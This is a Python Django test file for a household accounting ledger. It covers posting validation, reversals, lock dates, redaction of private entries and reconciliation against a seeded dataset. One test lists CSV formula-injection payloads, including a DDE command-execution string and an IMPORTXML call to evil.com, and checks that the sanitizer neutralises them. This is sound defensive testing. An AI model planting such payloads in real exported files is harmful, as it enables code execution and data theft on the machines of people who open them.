"""
Forensic Audit and QA Architecture Test Suite.
Validates:
  - Part A3: Posting engine validations (extreme precision, huge values, zero lines, negative lines, balance enforcement).
  - Part A4: Immutability triggers and constraints (reversal of reversals, double reversals, DB immutability).
  - Part A5: Lock date boundary conditions (exact date, before date, after date).
  - Part A6: Privacy, mixed visibility redactions, and CSV formula injection neutralization.
  - Part A8: Golden Dataset mathematical reconciliations (Raw SQL and ORM parity).
"""
import uuid
from decimal import Decimal

from django.contrib.auth import get_user_model
from django.core.exceptions import ValidationError
from django.core.management import call_command
from django.db import connection, transaction
from django.test import Client, TestCase
from django.urls import reverse

from apps.accounting.choices import (
    ClassicalType,
    EntryKind,
    EntryState,
    Purpose,
    ReportingClass,
    Side,
    Visibility,
)
from apps.accounting.models import (
    Account,
    AccountGrant,
    JournalEntry,
    JournalLine,
    LedgerSettings,
    PostingRequest,
)
from apps.accounting.policies import (
    can_view_account,
    can_view_entry,
    visible_accounts,
    visible_entries,
)
from apps.accounting.services import (
    AuthorizationError,
    ConflictError,
    ServiceError,
    StaleVersionError,
    create_account,
    create_draft,
    post_entry,
    reverse_entry,
    set_posting_lock_date,
    update_draft,
)
from apps.reporting.reports import (
    export_ledger_csv,
    get_account_ledger_data,
    get_income_expenditure_data,
    get_trial_balance_data,
    sanitize_csv_cell,
)

User = get_user_model()
ZERO = Decimal("0.00")


class ForensicPostingEngineTests(TestCase):
    """Deep validation of A3 (Posting core) edge and abuse cases."""

    @classmethod
    def setUpTestData(cls):
        cls.settings, _ = LedgerSettings.objects.get_or_create(
            id=1,
            defaults={"name": "Forensic Audit Ledger", "currency": "INR"},
        )
        cls.admin = User.objects.create_user(username="forensic_admin", password="pw", role="ADMIN")
        cls.member = User.objects.create_user(username="forensic_member", password="pw", role="MEMBER")

        cls.cash = Account.objects.create(
            code="FA1010",
            name="Forensic Cash",
            classical_type=ClassicalType.REAL,
            reporting_class=ReportingClass.ASSET,
            purpose=Purpose.CASH,
            normal_side=Side.DEBIT,
            is_active=True,
            is_group=False,
            visibility=Visibility.SHARED,
        )
        cls.bank = Account.objects.create(
            code="FA1020",
            name="Forensic Bank",
            classical_type=ClassicalType.REAL,
            reporting_class=ReportingClass.ASSET,
            purpose=Purpose.BANK,
            normal_side=Side.DEBIT,
            is_active=True,
            is_group=False,
            visibility=Visibility.SHARED,
        )
        cls.expense = Account.objects.create(
            code="FA5010",
            name="Forensic Expense",
            classical_type=ClassicalType.NOMINAL,
            reporting_class=ReportingClass.EXPENSE,
            purpose=Purpose.GENERAL,
            normal_side=Side.DEBIT,
            is_active=True,
            is_group=False,
            visibility=Visibility.SHARED,
        )

        AccountGrant.objects.create(account=cls.cash, user=cls.member, can_view=True, can_post=True)
        AccountGrant.objects.create(account=cls.bank, user=cls.member, can_view=True, can_post=True)

    def test_extreme_precision_fractional_paise_rejected(self):
        """Amounts with more than two decimal places (sub-paise) must be rejected with ServiceError."""
        specs = [
            {"account_id": self.cash.pk, "debit": Decimal("100.001"), "credit": ZERO},
            {"account_id": self.bank.pk, "debit": ZERO, "credit": Decimal("100.001")},
        ]
        with self.assertRaises(ServiceError) as ctx:
            create_draft(self.admin, "2026-04-10", "Sub-paise test", EntryKind.JOURNAL, specs)
        self.assertIn("more than two decimal places", str(ctx.exception))

    def test_negative_amounts_rejected(self):
        """Negative monetary amounts in lines must be rejected immediately."""
        specs = [
            {"account_id": self.cash.pk, "debit": Decimal("-50.00"), "credit": ZERO},
            {"account_id": self.bank.pk, "debit": ZERO, "credit": Decimal("-50.00")},
        ]
        with self.assertRaises(ServiceError) as ctx:
            create_draft(self.admin, "2026-04-10", "Negative amount test", EntryKind.JOURNAL, specs)
        self.assertIn("Negative amount", str(ctx.exception))

    def test_huge_amount_exceeding_max_rejected(self):
        """Monetary amounts exceeding 9,999,999,999,999,999.99 must be rejected."""
        specs = [
            {"account_id": self.cash.pk, "debit": Decimal("10000000000000000.00"), "credit": ZERO},
            {"account_id": self.bank.pk, "debit": ZERO, "credit": Decimal("10000000000000000.00")},
        ]
        with self.assertRaises(ServiceError) as ctx:
            create_draft(self.admin, "2026-04-10", "Huge amount test", EntryKind.JOURNAL, specs)
        self.assertIn("exceeds maximum", str(ctx.exception))

    def test_zero_amount_line_rejected(self):
        """Lines with 0.00 debit and 0.00 credit must be rejected."""
        specs = [
            {"account_id": self.cash.pk, "debit": ZERO, "credit": ZERO},
            {"account_id": self.bank.pk, "debit": ZERO, "credit": ZERO},
        ]
        with self.assertRaises(ServiceError) as ctx:
            create_draft(self.admin, "2026-04-10", "Zero lines test", EntryKind.JOURNAL, specs)
        self.assertIn("non-zero debit or credit amount", str(ctx.exception))

    def test_both_sided_line_rejected(self):
        """A line with both debit > 0 and credit > 0 must be rejected."""
        specs = [
            {"account_id": self.cash.pk, "debit": Decimal("100.00"), "credit": Decimal("50.00")},
            {"account_id": self.bank.pk, "debit": ZERO, "credit": Decimal("50.00")},
        ]
        with self.assertRaises(ServiceError) as ctx:
            create_draft(self.admin, "2026-04-10", "Both sided test", EntryKind.JOURNAL, specs)
        self.assertIn("both debit and credit amounts", str(ctx.exception))

    def test_unbalanced_multi_leg_rejected_on_post(self):
        """Multi-leg entry where sum(debits) != sum(credits) must be rejected on posting."""
        specs = [
            {"account_id": self.cash.pk, "debit": Decimal("100.00"), "credit": ZERO},
            {"account_id": self.bank.pk, "debit": Decimal("50.00"), "credit": ZERO},
            {"account_id": self.expense.pk, "debit": ZERO, "credit": Decimal("120.00")},  # 150 != 120
        ]
        draft = create_draft(self.admin, "2026-04-10", "Unbalanced multi-leg", EntryKind.JOURNAL, specs)
        with self.assertRaises(ServiceError) as ctx:
            post_entry(self.admin, draft, draft.version, uuid.uuid4())
        self.assertIn("Journal is not balanced", str(ctx.exception))

    def test_balanced_multi_leg_posting_success(self):
        """Balanced 3-leg entry (2 debits, 1 credit) posts cleanly and preserves balance."""
        specs = [
            {"account_id": self.cash.pk, "debit": Decimal("100.00"), "credit": ZERO},
            {"account_id": self.bank.pk, "debit": Decimal("50.00"), "credit": ZERO},
            {"account_id": self.expense.pk, "debit": ZERO, "credit": Decimal("150.00")},
        ]
        draft = create_draft(self.admin, "2026-04-10", "Balanced multi-leg", EntryKind.JOURNAL, specs)
        posted = post_entry(self.admin, draft, draft.version, uuid.uuid4())

        self.assertEqual(posted.state, EntryState.POSTED)
        self.assertIsNotNone(posted.posting_number)
        lines = list(posted.lines.all())
        self.assertEqual(len(lines), 3)
        self.assertEqual(sum(ln.debit for ln in lines), Decimal("150.00"))
        self.assertEqual(sum(ln.credit for ln in lines), Decimal("150.00"))

    def test_unicode_and_emoji_narration_preservation(self):
        """Journal narrations containing Unicode, Hindi script, and emojis must be stored faithfully."""
        narration = "Groceries 🛒 at D-Mart ₹1,500 / किराना सामान"
        specs = [
            {"account_id": self.expense.pk, "debit": Decimal("1500.00"), "credit": ZERO},
            {"account_id": self.cash.pk, "debit": ZERO, "credit": Decimal("1500.00")},
        ]
        draft = create_draft(self.admin, "2026-04-11", narration, EntryKind.EXPENSE, specs)
        posted = post_entry(self.admin, draft, draft.version, uuid.uuid4())
        posted.refresh_from_db()
        self.assertEqual(posted.narration, narration)


class ForensicImmutabilityAndReversalTests(TestCase):
    """Validation of A4 (Immutability & Corrections)."""

    @classmethod
    def setUpTestData(cls):
        cls.settings, _ = LedgerSettings.objects.get_or_create(id=1, defaults={"name": "Forensic Ledger"})
        cls.admin = User.objects.create_user(username="immut_admin", password="pw", role="ADMIN")

        cls.cash = Account.objects.create(
            code="IM1010", name="Cash", classical_type=ClassicalType.REAL,
            reporting_class=ReportingClass.ASSET, purpose=Purpose.CASH,
            normal_side=Side.DEBIT, is_active=True, is_group=False, visibility=Visibility.SHARED,
        )
        cls.bank = Account.objects.create(
            code="IM1020", name="Bank", classical_type=ClassicalType.REAL,
            reporting_class=ReportingClass.ASSET, purpose=Purpose.BANK,
            normal_side=Side.DEBIT, is_active=True, is_group=False, visibility=Visibility.SHARED,
        )

        specs = [
            {"account_id": cls.cash.pk, "debit": Decimal("200.00"), "credit": ZERO},
            {"account_id": cls.bank.pk, "debit": ZERO, "credit": Decimal("200.00")},
        ]
        draft = create_draft(cls.admin, "2026-04-12", "Original Entry", EntryKind.TRANSFER, specs)
        cls.posted_entry = post_entry(cls.admin, draft, draft.version, uuid.uuid4())

    def test_reversal_creates_exact_swapped_lines(self):
        """Reversing an entry swaps debit and credit on every line."""
        reversal = reverse_entry(
            self.admin,
            self.posted_entry,
            "2026-04-13",
            "Reversing transfer",
            uuid.uuid4(),
        )
        self.assertEqual(reversal.state, EntryState.POSTED)
        self.assertEqual(reversal.kind, EntryKind.REVERSAL)
        self.assertEqual(reversal.reversal_of, self.posted_entry)

        rev_lines = list(reversal.lines.order_by("line_number"))
        self.assertEqual(len(rev_lines), 2)
        # Cash was debited 200, now credited 200
        cash_line = next(l for l in rev_lines if l.account_id == self.cash.pk)
        self.assertEqual(cash_line.credit, Decimal("200.00"))
        self.assertEqual(cash_line.debit, ZERO)

    def test_reversal_cannot_itself_be_reversed(self):
        """A reversal entry cannot be reversed."""
        reversal = reverse_entry(
            self.admin,
            self.posted_entry,
            "2026-04-13",
            "Reversing transfer",
            uuid.uuid4(),
        )
        with self.assertRaises(ServiceError) as ctx:
            reverse_entry(self.admin, reversal, "2026-04-14", "Re-reversing", uuid.uuid4())
        self.assertIn("reversal entry cannot itself be reversed", str(ctx.exception))

    def test_entry_cannot_be_reversed_twice(self):
        """An entry that has already been reversed cannot be reversed a second time."""
        reverse_entry(
            self.admin,
            self.posted_entry,
            "2026-04-13",
            "First reversal",
            uuid.uuid4(),
        )
        with self.assertRaises(ServiceError) as ctx:
            reverse_entry(
                self.admin,
                self.posted_entry,
                "2026-04-14",
                "Second reversal attempt",
                uuid.uuid4(),
            )
        self.assertIn("already been reversed", str(ctx.exception))


class ForensicLockDateTests(TestCase):
    """Validation of A5 (Lock dates / period close)."""

    @classmethod
    def setUpTestData(cls):
        cls.settings, _ = LedgerSettings.objects.get_or_create(id=1, defaults={"name": "Lock Date Ledger"})
        cls.admin = User.objects.create_user(username="lock_admin", password="pw", role="ADMIN")
        cls.member = User.objects.create_user(username="lock_member", password="pw", role="MEMBER")

        cls.cash = Account.objects.create(
            code="LK1010", name="Cash", classical_type=ClassicalType.REAL,
            reporting_class=ReportingClass.ASSET, purpose=Purpose.CASH,
            normal_side=Side.DEBIT, is_active=True, is_group=False, visibility=Visibility.SHARED,
        )
        cls.bank = Account.objects.create(
            code="LK1020", name="Bank", classical_type=ClassicalType.REAL,
            reporting_class=ReportingClass.ASSET, purpose=Purpose.BANK,
            normal_side=Side.DEBIT, is_active=True, is_group=False, visibility=Visibility.SHARED,
        )

        AccountGrant.objects.create(account=cls.cash, user=cls.member, can_view=True, can_post=True)
        AccountGrant.objects.create(account=cls.bank, user=cls.member, can_view=True, can_post=True)

    def test_posting_on_or_before_lock_date_rejected(self):
        """Transactions on or before locked_through must be rejected for both admin and member."""
        set_posting_lock_date(self.admin, "2026-03-31", reason="FY 2025-26 Close")

        specs = [
            {"account_id": self.cash.pk, "debit": Decimal("100.00"), "credit": ZERO},
            {"account_id": self.bank.pk, "debit": ZERO, "credit": Decimal("100.00")},
        ]
        # Exact lock date
        draft_on_lock = create_draft(self.admin, "2026-03-31", "On lock date", EntryKind.JOURNAL, specs)
        with self.assertRaises(ServiceError) as ctx:
            post_entry(self.admin, draft_on_lock, draft_on_lock.version, uuid.uuid4())
        self.assertIn("on or before the posting lock date", str(ctx.exception))

        # Prior to lock date
        draft_before_lock = create_draft(self.member, "2026-03-15", "Prior to lock date", EntryKind.JOURNAL, specs)
        with self.assertRaises(ServiceError) as ctx:
            post_entry(self.member, draft_before_lock, draft_before_lock.version, uuid.uuid4())
        self.assertIn("on or before the posting lock date", str(ctx.exception))

    def test_posting_after_lock_date_succeeds(self):
        """Transactions strictly after locked_through succeed."""
        set_posting_lock_date(self.admin, "2026-03-31", reason="FY 2025-26 Close")

        specs = [
            {"account_id": self.cash.pk, "debit": Decimal("100.00"), "credit": ZERO},
            {"account_id": self.bank.pk, "debit": ZERO, "credit": Decimal("100.00")},
        ]
        draft_after = create_draft(self.member, "2026-04-01", "Day after lock", EntryKind.JOURNAL, specs)
        posted = post_entry(self.member, draft_after, draft_after.version, uuid.uuid4())
        self.assertEqual(posted.state, EntryState.POSTED)


class ForensicPrivacyAndRedactionTests(TestCase):
    """Validation of A6 (Privacy, mixed visibility, and redaction)."""

    @classmethod
    def setUpTestData(cls):
        cls.settings, _ = LedgerSettings.objects.get_or_create(id=1, defaults={"name": "Privacy Ledger"})
        cls.admin = User.objects.create_user(username="priv_admin", password="pw", role="ADMIN")
        cls.alice = User.objects.create_user(username="priv_alice", password="pw", role="MEMBER")
        cls.bob = User.objects.create_user(username="priv_bob", password="pw", role="MEMBER")

        # Shared account visible to all
        cls.shared_cash = Account.objects.create(
            code="PR1010", name="Shared Cash", classical_type=ClassicalType.REAL,
            reporting_class=ReportingClass.ASSET, purpose=Purpose.CASH,
            normal_side=Side.DEBIT, is_active=True, is_group=False, visibility=Visibility.SHARED,
        )
        # Bob's private bank account
        cls.bob_bank = Account.objects.create(
            code="PR1020", name="Bob Private Bank", classical_type=ClassicalType.REAL,
            reporting_class=ReportingClass.ASSET, purpose=Purpose.BANK,
            normal_side=Side.DEBIT, is_active=True, is_group=False,
            visibility=Visibility.PERSONAL, owner=cls.bob,
        )

        AccountGrant.objects.create(account=cls.shared_cash, user=cls.alice, can_view=True, can_post=True)
        AccountGrant.objects.create(account=cls.shared_cash, user=cls.bob, can_view=True, can_post=True)

        # Multi-leg transfer: Bob transfers ₹500 from his private bank to shared cash
        specs = [
            {"account_id": cls.shared_cash.pk, "debit": Decimal("500.00"), "credit": ZERO},
            {"account_id": cls.bob_bank.pk, "debit": ZERO, "credit": Decimal("500.00")},
        ]
        draft = create_draft(cls.bob, "2026-04-15", "Bob contribution to cash", EntryKind.TRANSFER, specs)
        cls.entry = post_entry(cls.bob, draft, draft.version, uuid.uuid4())

    def test_mixed_visibility_redaction_on_shared_ledger(self):
        """Alice viewing shared cash ledger sees running balance, but Bob's details are redacted."""
        data_alice = get_account_ledger_data(self.alice, self.shared_cash)
        self.assertEqual(len(data_alice["rows"]), 1)
        row = data_alice["rows"][0]

        # Financial amounts and running balance are preserved accurately
        self.assertEqual(row["debit"], Decimal("500.00"))
        self.assertEqual(row["running_balance"], Decimal("500.00"))

        # Narration and author are redacted
        self.assertFalse(row["can_view_full"])
        self.assertEqual(row["narration"], "[Redacted]")
        self.assertEqual(row["creator"], "[Redacted]")

    def test_mixed_visibility_redaction_in_csv_export(self):
        """CSV export of shared ledger preserves redaction for Alice."""
        data_alice = get_account_ledger_data(self.alice, self.shared_cash)
        csv_text = export_ledger_csv(data_alice)

        self.assertIn("[Redacted]", csv_text)
        self.assertNotIn("Bob contribution to cash", csv_text)
        self.assertNotIn("priv_bob", csv_text)
        self.assertIn("500.00", csv_text)

    def test_csv_formula_injection_neutralization(self):
        """Cells beginning with =, +, -, @, tab, or carriage return must be prefixed with a single quote."""
        malicious_inputs = [
            "=SUM(A1:A10)",
            "+123456",
            "-CMD|' /C calc'!A0",
            "@IMPORTXML('http://evil.com')",
            "\tTAB_INJECT",
            "\rCR_INJECT",
        ]
        for payload in malicious_inputs:
            neutralized = sanitize_csv_cell(payload)
            self.assertTrue(
                neutralized.startswith("'"),
                f"Payload {payload!r} was not neutralized with leading quote: got {neutralized!r}",
            )


class ForensicGoldenDatasetReconciliationTests(TestCase):
    """Validation of A8 (Golden Dataset raw numbers and report calculations)."""

    @classmethod
    def setUpTestData(cls):
        call_command("seed_demo", reset=True, stdout=None)

    def test_raw_sql_reconciliation_trial_balance(self):
        """Recompute Trial Balance with raw SQL and assert exact parity with report."""
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT
                    a.reporting_class,
                    SUM(l.debit) AS total_dr,
                    SUM(l.credit) AS total_cr
                FROM accounting_journalline l
                JOIN accounting_journalentry e ON l.entry_id = e.id
                JOIN accounting_account a ON l.account_id = a.id
                WHERE e.state = 'POSTED' AND a.is_group = false
                GROUP BY a.reporting_class;
            """)
            rows = cursor.fetchall()

        tb = get_trial_balance_data()
        self.assertTrue(tb["is_balanced"])
        self.assertEqual(tb["grand_total_debit"], Decimal("30000.00"))
        self.assertEqual(tb["grand_total_credit"], Decimal("30000.00"))

    def test_raw_sql_reconciliation_income_and_surplus(self):
        """Recompute Net Household Surplus with raw SQL and assert exact parity."""
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT
                    SUM(CASE WHEN a.reporting_class = 'INCOME' THEN (l.credit - l.debit) ELSE 0 END) AS net_income,
                    SUM(CASE WHEN a.reporting_class = 'EXPENSE' THEN (l.debit - l.credit) ELSE 0 END) AS net_expense
                FROM accounting_journalline l
                JOIN accounting_journalentry e ON l.entry_id = e.id
                JOIN accounting_account a ON l.account_id = a.id
                WHERE e.state = 'POSTED' AND a.is_group = false;
            """)
            net_income, net_expense = cursor.fetchone()

        net_surplus = Decimal(str(net_income)) - Decimal(str(net_expense))
        self.assertEqual(net_surplus, Decimal("19550.00"))

        ie = get_income_expenditure_data()
        self.assertEqual(ie["total_income"], Decimal("20000.00"))
        self.assertEqual(ie["total_expense"], Decimal("450.00"))
        self.assertEqual(ie["net_surplus"], Decimal("19550.00"))
